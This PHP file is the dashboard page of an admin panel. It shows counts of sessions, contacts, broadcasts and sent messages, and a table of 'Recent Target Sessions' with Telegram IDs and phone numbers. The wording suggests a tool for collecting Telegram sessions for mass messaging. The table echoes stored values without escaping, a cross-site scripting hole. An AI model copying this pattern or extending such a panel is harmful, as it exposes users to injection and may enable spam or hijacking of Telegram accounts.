<?php
require_once __DIR__ . '/../core/auth.php';
check_auth();
require_once __DIR__ . '/../core/layout.php';

// Fetch stats
$stats = [
    'sessions' => $pdo->query("SELECT COUNT(*) FROM user_sessions")->fetchColumn(),
    'contacts' => $pdo->query("SELECT COUNT(*) FROM contacts")->fetchColumn(),
    'broadcasts' => $pdo->query("SELECT COUNT(*) FROM broadcasts")->fetchColumn(),
    'sent' => $pdo->query("SELECT SUM(sent_count) FROM broadcasts")->fetchColumn() ?? 0,
];

load_header('Dashboard');
?>
<div class="row g-3 mb-4">
    <div class="col-md-3">
        <div class="card border-0 shadow-sm">
            <div class="card-body d-flex align-items-center">
                <div class="bg-primary bg-opacity-10 text-primary rounded p-3 me-3">
                    <i class="fa-solid fa-users fs-4"></i>
                </div>
                <div>
                    <h6 class="text-muted mb-1 small fw-bold">Active Sessions</h6>
                    <h3 class="mb-0 fw-bold"><?= number_format($stats['sessions']) ?></h3>
                </div>
            </div>
        </div>
    </div>
    <div class="col-md-3">
        <div class="card border-0 shadow-sm">
            <div class="card-body d-flex align-items-center">
                <div class="bg-success bg-opacity-10 text-success rounded p-3 me-3">
                    <i class="fa-solid fa-address-book fs-4"></i>
                </div>
                <div>
                    <h6 class="text-muted mb-1 small fw-bold">Total Contacts</h6>
                    <h3 class="mb-0 fw-bold"><?= number_format($stats['contacts']) ?></h3>
                </div>
            </div>
        </div>
    </div>
    <div class="col-md-3">
        <div class="card border-0 shadow-sm">
            <div class="card-body d-flex align-items-center">
                <div class="bg-warning bg-opacity-10 text-warning rounded p-3 me-3">
                    <i class="fa-solid fa-bullhorn fs-4"></i>
                </div>
                <div>
                    <h6 class="text-muted mb-1 small fw-bold">Broadcasts</h6>
                    <h3 class="mb-0 fw-bold"><?= number_format($stats['broadcasts']) ?></h3>
                </div>
            </div>
        </div>
    </div>
    <div class="col-md-3">
        <div class="card border-0 shadow-sm">
            <div class="card-body d-flex align-items-center">
                <div class="bg-info bg-opacity-10 text-info rounded p-3 me-3">
                    <i class="fa-solid fa-paper-plane fs-4"></i>
                </div>
                <div>
                    <h6 class="text-muted mb-1 small fw-bold">Messages Sent</h6>
                    <h3 class="mb-0 fw-bold"><?= number_format($stats['sent']) ?></h3>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="card border-0 shadow-sm">
    <div class="card-header border-bottom">
        <h6 class="mb-0 fw-bold"><i class="fa-solid fa-chart-area text-primary me-2"></i> Recent Target Sessions</h6>
    </div>
    <div class="card-body p-0">
        <div class="table-responsive">
            <table class="table mb-0 table-hover">
                <thead class="bg-light">
                    <tr>
                        <th class="border-top-0">Telegram ID</th>
                        <th class="border-top-0">Phone Number</th>
                        <th class="border-top-0">Status</th>
                        <th class="border-top-0 text-end">Action</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    $stmt = $pdo->query("SELECT * FROM user_sessions ORDER BY id DESC LIMIT 5");
                    $sessions = $stmt->fetchAll();
                    if (count($sessions) > 0) {
                        foreach ($sessions as $s) {
                            $status_class = $s['status'] == 'active' ? 'success' : ($s['status'] == 'pending' ? 'warning' : 'danger');
                            echo '<tr>
                                <td><span class="fw-medium">'.$s['telegram_id'].'</span></td>
                                <td>'.$s['phone_number'].'</td>
                                <td><span class="badge bg-'.$status_class.' rounded-pill">'.ucfirst($s['status']).'</span></td>
                                <td class="text-end"><button class="btn btn-sm btn-light border"><i class="fa-solid fa-cog"></i></button></td>
                            </tr>';
                        }
                    } else {
                        echo '<tr><td colspan="4" class="text-center py-4 text-muted">No sessions yet. Members can connect via Bot.</td></tr>';
                    }
                    ?>
                </tbody>
            </table>
        </div>
    </div>
</div>
<?php load_footer(); ?>
